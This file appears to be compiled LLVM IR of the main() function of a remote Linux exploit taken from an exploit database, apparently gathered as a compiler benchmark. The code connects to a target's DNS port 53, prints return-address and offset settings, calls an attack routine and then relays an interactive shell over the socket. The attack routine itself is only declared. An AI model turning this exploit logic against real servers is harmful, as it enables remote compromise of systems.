; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_19111.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_19111.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i32, i32, i8*, i32 }
%struct.sockaddr_in = type { %struct.TYPE_5__, i32, i32 }
%struct.TYPE_5__ = type { i32 }
%struct.sockaddr = type { i32 }

@DEFAULT_ANBUF_OFFSET = common dso_local global i64 0, align 8
@DEFAULT_OPTIMIZATION = common dso_local global i32 0, align 4
@target = common dso_local global %struct.TYPE_4__* null, align 8
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [16 x i8] c"\0Atarget types:\0A\00", align 1
@.str.1 = private unnamed_addr constant [12 x i8] c" %-2d : %s\0A\00", align 1
@.str.2 = private unnamed_addr constant [44 x i8] c"\0Aerror: usage: %s <host> [tt] [opt] [ofst]\0A\00", align 1
@.str.3 = private unnamed_addr constant [31 x i8] c"error: invalid target type %d\0A\00", align 1
@DEFAULT_TARGET = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [40 x i8] c"error: invalid optimization setting %d\0A\00", align 1
@.str.5 = private unnamed_addr constant [28 x i8] c"error: can not resolve: %s\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [14 x i8] c"error: socket\00", align 1
@.str.7 = private unnamed_addr constant [15 x i8] c"error: connect\00", align 1
@.str.8 = private unnamed_addr constant [25 x i8] c"target             : %s\0A\00", align 1
@.str.9 = private unnamed_addr constant [25 x i8] c"target type        : %s\0A\00", align 1
@.str.10 = private unnamed_addr constant [25 x i8] c"optimized named    : %s\0A\00", align 1
@.str.11 = private unnamed_addr constant [4 x i8] c"YES\00", align 1
@.str.12 = private unnamed_addr constant [3 x i8] c"NO\00", align 1
@.str.13 = private unnamed_addr constant [27 x i8] c"anbuff addr        : 0x%x\0A\00", align 1
@.str.14 = private unnamed_addr constant [26 x i8] c"anbuff addr offset : %lu\0A\00", align 1
@.str.15 = private unnamed_addr constant [27 x i8] c"ret addr           : 0x%x\0A\00", align 1
@.str.16 = private unnamed_addr constant [25 x i8] c"fd to make dups of : %d\0A\00", align 1
@.str.17 = private unnamed_addr constant [15 x i8] c"here we go...\0A\00", align 1
@.str.18 = private unnamed_addr constant [14 x i8] c"error: attack\00", align 1
@.str.19 = private unnamed_addr constant [23 x i8] c"error: internal error\0A\00", align 1
@.str.20 = private unnamed_addr constant [11 x i8] c"have fun.\0A\00", align 1
@.str.21 = private unnamed_addr constant [9 x i8] c"-ROTShB\0A\00", align 1
@stdin = common dso_local global i32 0, align 4
@stdout = common dso_local global i32 0, align 4
@.str.22 = private unnamed_addr constant [14 x i8] c"error: select\00", align 1
@.str.23 = private unnamed_addr constant [12 x i8] c"error: read\00", align 1
@.str.24 = private unnamed_addr constant [13 x i8] c"error: write\00", align 1
@.str.25 = private unnamed_addr constant [13 x i8] c"error: close\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [128 x i8], align 16
  %7 = alloca [128 x i8], align 16
  %8 = alloca i64, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %18 = load i64, i64* @DEFAULT_ANBUF_OFFSET, align 8
  store i64 %18, i64* %8, align 8
  %19 = load i32, i32* @DEFAULT_OPTIMIZATION, align 4
  store i32 %19, i32* %10, align 4
  store i32 0, i32* %13, align 4
  store i32 0, i32* %14, align 4
  store i32 0, i32* %12, align 4
  br label %20

20:                                               ; preds = %39, %2
  %21 = load %struct.TYPE_4__*, %struct.TYPE_4__** @target, align 8
  %22 = load i32, i32* %12, align 4
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %21, i64 %23
  %25 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %24, i32 0, i32 0
  %26 = load i32, i32* %25, align 8
  %27 = icmp ne i32 %26, 0
  br i1 %27, label %36, label %28

28:                                               ; preds = %20
  %29 = load %struct.TYPE_4__*, %struct.TYPE_4__** @target, align 8
  %30 = load i32, i32* %12, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %29, i64 %31
  %33 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %32, i32 0, i32 1
  %34 = load i32, i32* %33, align 4
  %35 = icmp ne i32 %34, 0
  br label %36

36:                                               ; preds = %28, %20
  %37 = phi i1 [ true, %20 ], [ %35, %28 ]
  br i1 %37, label %38, label %42

38:                                               ; preds = %36
  br label %39

39:                                               ; preds = %38
  %40 = load i32, i32* %12, align 4
  %41 = add nsw i32 %40, 1
  store i32 %41, i32* %12, align 4
  br label %20

42:                                               ; preds = %36
  %43 = load i32, i32* %4, align 4
  %44 = icmp slt i32 %43, 2
  br i1 %44, label %45, label %72

45:                                               ; preds = %42
  %46 = load i32, i32* @stderr, align 4
  %47 = call i32 (i32, i8*, ...) @fprintf(i32 %46, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str, i64 0, i64 0))
  store i32 0, i32* %9, align 4
  br label %48

48:                                               ; preds = %62, %45
  %49 = load i32, i32* %9, align 4
  %50 = load i32, i32* %12, align 4
  %51 = icmp slt i32 %49, %50
  br i1 %51, label %52, label %65

52:                                               ; preds = %48
  %53 = load i32, i32* @stderr, align 4
  %54 = load i32, i32* %9, align 4
  %55 = load %struct.TYPE_4__*, %struct.TYPE_4__** @target, align 8
  %56 = load i32, i32* %9, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %55, i64 %57
  %59 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %58, i32 0, i32 2
  %60 = load i8*, i8** %59, align 8
  %61 = call i32 (i32, i8*, ...) @fprintf(i32 %53, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i64 0, i64 0), i32 %54, i8* %60)
  br label %62

62:                                               ; preds = %52
  %63 = load i32, i32* %9, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %9, align 4
  br label %48

65:                                               ; preds = %48
  %66 = load i32, i32* @stderr, align 4
  %67 = load i8**, i8*** %5, align 8
  %68 = getelementptr inbounds i8*, i8** %67, i64 0
  %69 = load i8*, i8** %68, align 8
  %70 = call i32 (i32, i8*, ...) @fprintf(i32 %66, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.2, i64 0, i64 0), i8* %69)
  %71 = call i32 @exit(i32 -1) #3
  unreachable

72:                                               ; preds = %42
  %73 = load i32, i32* %4, align 4
  %74 = icmp sgt i32 %73, 2
  br i1 %74, label %75, label %93

75:                                               ; preds = %72
  %76 = load i8**, i8*** %5, align 8
  %77 = getelementptr inbounds i8*, i8** %76, i64 2
  %78 = load i8*, i8** %77, align 8
  %79 = call i8* @atoi(i8* %78)
  %80 = ptrtoint i8* %79 to i32
  store i32 %80, i32* %9, align 4
  %81 = load i32, i32* %9, align 4
  %82 = icmp slt i32 %81, 0
  br i1 %82, label %87, label %83

83:                                               ; preds = %75
  %84 = load i32, i32* %9, align 4
  %85 = load i32, i32* %12, align 4
  %86 = icmp sgt i32 %84, %85
  br i1 %86, label %87, label %92

87:                                               ; preds = %83, %75
  %88 = load i32, i32* @stderr, align 4
  %89 = load i32, i32* %9, align 4
  %90 = call i32 (i32, i8*, ...) @fprintf(i32 %88, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.3, i64 0, i64 0), i32 %89)
  %91 = call i32 @exit(i32 -1) #3
  unreachable

92:                                               ; preds = %83
  br label %95

93:                                               ; preds = %72
  %94 = load i32, i32* @DEFAULT_TARGET, align 4
  store i32 %94, i32* %9, align 4
  br label %95

95:                                               ; preds = %93, %92
  %96 = load i32, i32* %4, align 4
  %97 = icmp sgt i32 %96, 3
  br i1 %97, label %98, label %115

98:                                               ; preds = %95
  %99 = load i8**, i8*** %5, align 8
  %100 = getelementptr inbounds i8*, i8** %99, i64 3
  %101 = load i8*, i8** %100, align 8
  %102 = call i8* @atoi(i8* %101)
  %103 = ptrtoint i8* %102 to i32
  store i32 %103, i32* %10, align 4
  %104 = load i32, i32* %10, align 4
  %105 = icmp ne i32 %104, 0
  br i1 %105, label %106, label %114

106:                                              ; preds = %98
  %107 = load i32, i32* %10, align 4
  %108 = icmp ne i32 %107, 1
  br i1 %108, label %109, label %114

109:                                              ; preds = %106
  %110 = load i32, i32* @stderr, align 4
  %111 = load i32, i32* %10, align 4
  %112 = call i32 (i32, i8*, ...) @fprintf(i32 %110, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.4, i64 0, i64 0), i32 %111)
  %113 = call i32 @exit(i32 -1) #3
  unreachable

114:                                              ; preds = %106, %98
  br label %115

115:                                              ; preds = %114, %95
  %116 = load i32, i32* %4, align 4
  %117 = icmp sgt i32 %116, 4
  br i1 %117, label %118, label %124

118:                                              ; preds = %115
  %119 = load i8**, i8*** %5, align 8
  %120 = getelementptr inbounds i8*, i8** %119, i64 4
  %121 = load i8*, i8** %120, align 8
  %122 = call i8* @atoi(i8* %121)
  %123 = ptrtoint i8* %122 to i64
  store i64 %123, i64* %8, align 8
  br label %124

124:                                              ; preds = %118, %115
  %125 = load i8**, i8*** %5, align 8
  %126 = getelementptr inbounds i8*, i8** %125, i64 1
  %127 = load i8*, i8** %126, align 8
  %128 = call i32 @resolve(i8* %127)
  %129 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  %130 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %129, i32 0, i32 0
  store i32 %128, i32* %130, align 4
  %131 = icmp ne i32 %128, 0
  br i1 %131, label %139, label %132

132:                                              ; preds = %124
  %133 = load i32, i32* @stderr, align 4
  %134 = load i8**, i8*** %5, align 8
  %135 = getelementptr inbounds i8*, i8** %134, i64 1
  %136 = load i8*, i8** %135, align 8
  %137 = call i32 (i32, i8*, ...) @fprintf(i32 %133, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.5, i64 0, i64 0), i8* %136)
  %138 = call i32 @exit(i32 -1) #3
  unreachable

139:                                              ; preds = %124
  %140 = load i32, i32* @AF_INET, align 4
  %141 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i32 %140, i32* %141, align 4
  %142 = call i32 @htons(i32 53)
  %143 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  store i32 %142, i32* %143, align 4
  %144 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  %145 = load i32, i32* %144, align 4
  %146 = load i32, i32* @SOCK_STREAM, align 4
  %147 = call i32 @socket(i32 %145, i32 %146, i32 0)
  store i32 %147, i32* %11, align 4
  %148 = icmp eq i32 %147, -1
  br i1 %148, label %149, label %152

149:                                              ; preds = %139
  %150 = call i32 @perror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.6, i64 0, i64 0))
  %151 = call i32 @exit(i32 -1) #3
  unreachable

152:                                              ; preds = %139
  %153 = load i32, i32* %11, align 4
  %154 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %155 = call i32 @connect(i32 %153, %struct.sockaddr* %154, i32 12)
  %156 = icmp eq i32 %155, -1
  br i1 %156, label %157, label %160

157:                                              ; preds = %152
  %158 = call i32 @perror(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.7, i64 0, i64 0))
  %159 = call i32 @exit(i32 -1) #3
  unreachable

160:                                              ; preds = %152
  %161 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  %162 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %161, i32 0, i32 0
  %163 = load i32, i32* %162, align 4
  %164 = call i8* @inet_ntoa(i32 %163)
  %165 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.8, i64 0, i64 0), i8* %164)
  %166 = load %struct.TYPE_4__*, %struct.TYPE_4__** @target, align 8
  %167 = load i32, i32* %9, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %166, i64 %168
  %170 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %169, i32 0, i32 2
  %171 = load i8*, i8** %170, align 8
  %172 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.9, i64 0, i64 0), i8* %171)
  %173 = load i32, i32* %10, align 4
  %174 = icmp ne i32 %173, 0
  %175 = zext i1 %174 to i64
  %176 = select i1 %174, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.11, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.12, i64 0, i64 0)
  %177 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.10, i64 0, i64 0), i8* %176)
  %178 = load i32, i32* %10, align 4
  %179 = icmp ne i32 %178, 0
  br i1 %179, label %180, label %187

180:                                              ; preds = %160
  %181 = load %struct.TYPE_4__*, %struct.TYPE_4__** @target, align 8
  %182 = load i32, i32* %9, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %181, i64 %183
  %185 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %184, i32 0, i32 1
  %186 = load i32, i32* %185, align 4
  br label %194

187:                                              ; preds = %160
  %188 = load %struct.TYPE_4__*, %struct.TYPE_4__** @target, align 8
  %189 = load i32, i32* %9, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %188, i64 %190
  %192 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %191, i32 0, i32 0
  %193 = load i32, i32* %192, align 8
  br label %194

194:                                              ; preds = %187, %180
  %195 = phi i32 [ %186, %180 ], [ %193, %187 ]
  store i32 %195, i32* %12, align 4
  %196 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.13, i64 0, i64 0), i32 %195)
  %197 = load i64, i64* %8, align 8
  %198 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.14, i64 0, i64 0), i64 %197)
  %199 = load i32, i32* %12, align 4
  %200 = sext i32 %199 to i64
  %201 = load i64, i64* %8, align 8
  %202 = add i64 %200, %201
  %203 = trunc i64 %202 to i32
  %204 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.15, i64 0, i64 0), i32 %203)
  %205 = load %struct.TYPE_4__*, %struct.TYPE_4__** @target, align 8
  %206 = load i32, i32* %9, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %205, i64 %207
  %209 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %208, i32 0, i32 3
  %210 = load i32, i32* %209, align 8
  %211 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.16, i64 0, i64 0), i32 %210)
  %212 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.17, i64 0, i64 0))
  %213 = load i32, i32* %11, align 4
  %214 = load %struct.TYPE_4__*, %struct.TYPE_4__** @target, align 8
  %215 = load i32, i32* %9, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %214, i64 %216
  %218 = load i64, i64* %8, align 8
  %219 = load i32, i32* %10, align 4
  %220 = call i32 @attack(i32 %213, %struct.TYPE_4__* byval(%struct.TYPE_4__) align 8 %217, i64 %218, i32 %219)
  switch i32 %220, label %228 [
    i32 -1, label %221
    i32 0, label %224
  ]

221:                                              ; preds = %194
  %222 = call i32 @perror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.18, i64 0, i64 0))
  %223 = call i32 @exit(i32 -1) #3
  unreachable

224:                                              ; preds = %194
  %225 = load i32, i32* @stderr, align 4
  %226 = call i32 (i32, i8*, ...) @fprintf(i32 %225, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.19, i64 0, i64 0))
  %227 = call i32 @exit(i32 -1) #3
  unreachable

228:                                              ; preds = %194
  %229 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.20, i64 0, i64 0))
  %230 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.21, i64 0, i64 0))
  br label %231

231:                                              ; preds = %228, %301, %321, %354, %376, %378
  %232 = call i32 @FD_ZERO(i32* %15)
  %233 = load i32, i32* %14, align 4
  %234 = sext i32 %233 to i64
  %235 = icmp ult i64 %234, 127
  br i1 %235, label %236, label %239

236:                                              ; preds = %231
  %237 = load i32, i32* %11, align 4
  %238 = call i32 @FD_SET(i32 %237, i32* %15)
  br label %239

239:                                              ; preds = %236, %231
  %240 = load i32, i32* %13, align 4
  %241 = sext i32 %240 to i64
  %242 = icmp ult i64 %241, 127
  br i1 %242, label %243, label %247

243:                                              ; preds = %239
  %244 = load i32, i32* @stdin, align 4
  %245 = call i32 @fileno(i32 %244)
  %246 = call i32 @FD_SET(i32 %245, i32* %15)
  br label %247

247:                                              ; preds = %243, %239
  %248 = call i32 @FD_ZERO(i32* %16)
  %249 = load i32, i32* %13, align 4
  %250 = icmp ne i32 %249, 0
  br i1 %250, label %251, label %254

251:                                              ; preds = %247
  %252 = load i32, i32* %11, align 4
  %253 = call i32 @FD_SET(i32 %252, i32* %16)
  br label %254

254:                                              ; preds = %251, %247
  %255 = load i32, i32* %14, align 4
  %256 = icmp ne i32 %255, 0
  br i1 %256, label %257, label %261

257:                                              ; preds = %254
  %258 = load i32, i32* @stdout, align 4
  %259 = call i32 @fileno(i32 %258)
  %260 = call i32 @FD_SET(i32 %259, i32* %16)
  br label %261

261:                                              ; preds = %257, %254
  %262 = load i32, i32* %11, align 4
  %263 = add nsw i32 %262, 1
  %264 = call i32 @select(i32 %263, i32* %15, i32* %16, i32* null, i32* null)
  store i32 %264, i32* %9, align 4
  %265 = icmp eq i32 %264, -1
  br i1 %265, label %266, label %268

266:                                              ; preds = %261
  %267 = call i32 @perror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.22, i64 0, i64 0))
  br label %379

268:                                              ; preds = %261
  %269 = load i32, i32* @stdin, align 4
  %270 = call i32 @fileno(i32 %269)
  %271 = call i64 @FD_ISSET(i32 %270, i32* %15)
  %272 = icmp ne i64 %271, 0
  br i1 %272, label %273, label %303

273:                                              ; preds = %268
  %274 = load i32, i32* @stdin, align 4
  %275 = call i32 @fileno(i32 %274)
  %276 = getelementptr inbounds [128 x i8], [128 x i8]* %6, i64 0, i64 0
  %277 = load i32, i32* %13, align 4
  %278 = sext i32 %277 to i64
  %279 = getelementptr inbounds i8, i8* %276, i64 %278
  %280 = load i32, i32* %13, align 4
  %281 = sext i32 %280 to i64
  %282 = sub i64 128, %281
  %283 = trunc i64 %282 to i32
  %284 = call i32 @read(i32 %275, i8* %279, i32 %283)
  store i32 %284, i32* %12, align 4
  %285 = icmp eq i32 %284, -1
  br i1 %285, label %286, label %289

286:                                              ; preds = %273
  %287 = call i32 @perror(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.23, i64 0, i64 0))
  %288 = call i32 @exit(i32 -1) #3
  unreachable

289:                                              ; preds = %273
  %290 = load i32, i32* %12, align 4
  %291 = icmp eq i32 %290, 0
  br i1 %291, label %292, label %293

292:                                              ; preds = %289
  br label %379

293:                                              ; preds = %289
  br label %294

294:                                              ; preds = %293
  %295 = load i32, i32* %12, align 4
  %296 = load i32, i32* %13, align 4
  %297 = add nsw i32 %296, %295
  store i32 %297, i32* %13, align 4
  %298 = load i32, i32* %9, align 4
  %299 = add nsw i32 %298, -1
  store i32 %299, i32* %9, align 4
  %300 = icmp ne i32 %299, 0
  br i1 %300, label %302, label %301

301:                                              ; preds = %294
  br label %231

302:                                              ; preds = %294
  br label %303

303:                                              ; preds = %302, %268
  %304 = load i32, i32* %11, align 4
  %305 = call i64 @FD_ISSET(i32 %304, i32* %16)
  %306 = icmp ne i64 %305, 0
  br i1 %306, label %307, label %323

307:                                              ; preds = %303
  %308 = load i32, i32* %11, align 4
  %309 = getelementptr inbounds [128 x i8], [128 x i8]* %6, i64 0, i64 0
  %310 = load i32, i32* %13, align 4
  %311 = call i32 @write(i32 %308, i8* %309, i32 %310)
  %312 = load i32, i32* %13, align 4
  %313 = icmp ne i32 %311, %312
  br i1 %313, label %314, label %317

314:                                              ; preds = %307
  %315 = call i32 @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.24, i64 0, i64 0))
  %316 = call i32 @exit(i32 -1) #3
  unreachable

317:                                              ; preds = %307
  store i32 0, i32* %13, align 4
  %318 = load i32, i32* %9, align 4
  %319 = add nsw i32 %318, -1
  store i32 %319, i32* %9, align 4
  %320 = icmp ne i32 %319, 0
  br i1 %320, label %322, label %321

321:                                              ; preds = %317
  br label %231

322:                                              ; preds = %317
  br label %323

323:                                              ; preds = %322, %303
  %324 = load i32, i32* %11, align 4
  %325 = call i64 @FD_ISSET(i32 %324, i32* %15)
  %326 = icmp ne i64 %325, 0
  br i1 %326, label %327, label %356

327:                                              ; preds = %323
  %328 = load i32, i32* %11, align 4
  %329 = getelementptr inbounds [128 x i8], [128 x i8]* %7, i64 0, i64 0
  %330 = load i32, i32* %14, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds i8, i8* %329, i64 %331
  %333 = load i32, i32* %14, align 4
  %334 = sext i32 %333 to i64
  %335 = sub i64 128, %334
  %336 = trunc i64 %335 to i32
  %337 = call i32 @read(i32 %328, i8* %332, i32 %336)
  store i32 %337, i32* %12, align 4
  %338 = icmp eq i32 %337, -1
  br i1 %338, label %339, label %342

339:                                              ; preds = %327
  %340 = call i32 @perror(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.23, i64 0, i64 0))
  %341 = call i32 @exit(i32 -1) #3
  unreachable

342:                                              ; preds = %327
  %343 = load i32, i32* %12, align 4
  %344 = icmp eq i32 %343, 0
  br i1 %344, label %345, label %346

345:                                              ; preds = %342
  br label %379

346:                                              ; preds = %342
  br label %347

347:                                              ; preds = %346
  %348 = load i32, i32* %12, align 4
  %349 = load i32, i32* %14, align 4
  %350 = add nsw i32 %349, %348
  store i32 %350, i32* %14, align 4
  %351 = load i32, i32* %9, align 4
  %352 = add nsw i32 %351, -1
  store i32 %352, i32* %9, align 4
  %353 = icmp ne i32 %352, 0
  br i1 %353, label %355, label %354

354:                                              ; preds = %347
  br label %231

355:                                              ; preds = %347
  br label %356

356:                                              ; preds = %355, %323
  %357 = load i32, i32* @stdout, align 4
  %358 = call i32 @fileno(i32 %357)
  %359 = call i64 @FD_ISSET(i32 %358, i32* %16)
  %360 = icmp ne i64 %359, 0
  br i1 %360, label %361, label %378

361:                                              ; preds = %356
  %362 = load i32, i32* @stdout, align 4
  %363 = call i32 @fileno(i32 %362)
  %364 = getelementptr inbounds [128 x i8], [128 x i8]* %7, i64 0, i64 0
  %365 = load i32, i32* %14, align 4
  %366 = call i32 @write(i32 %363, i8* %364, i32 %365)
  %367 = load i32, i32* %14, align 4
  %368 = icmp ne i32 %366, %367
  br i1 %368, label %369, label %372

369:                                              ; preds = %361
  %370 = call i32 @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.24, i64 0, i64 0))
  %371 = call i32 @exit(i32 -1) #3
  unreachable

372:                                              ; preds = %361
  store i32 0, i32* %14, align 4
  %373 = load i32, i32* %9, align 4
  %374 = add nsw i32 %373, -1
  store i32 %374, i32* %9, align 4
  %375 = icmp ne i32 %374, 0
  br i1 %375, label %377, label %376

376:                                              ; preds = %372
  br label %231

377:                                              ; preds = %372
  br label %378

378:                                              ; preds = %377, %356
  br label %231

379:                                              ; preds = %345, %292, %266
  %380 = load i32, i32* %11, align 4
  %381 = call i32 @close(i32 %380)
  %382 = icmp eq i32 %381, -1
  br i1 %382, label %383, label %386

383:                                              ; preds = %379
  %384 = call i32 @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.25, i64 0, i64 0))
  %385 = call i32 @exit(i32 -1) #3
  unreachable

386:                                              ; preds = %379
  %387 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @fprintf(i32, i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i8* @atoi(i8*) #1

declare dso_local i32 @resolve(i8*) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i8* @inet_ntoa(i32) #1

declare dso_local i32 @attack(i32, %struct.TYPE_4__* byval(%struct.TYPE_4__) align 8, i64, i32) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i32 @fileno(i32) #1

declare dso_local i32 @select(i32, i32*, i32*, i32*, i32*) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
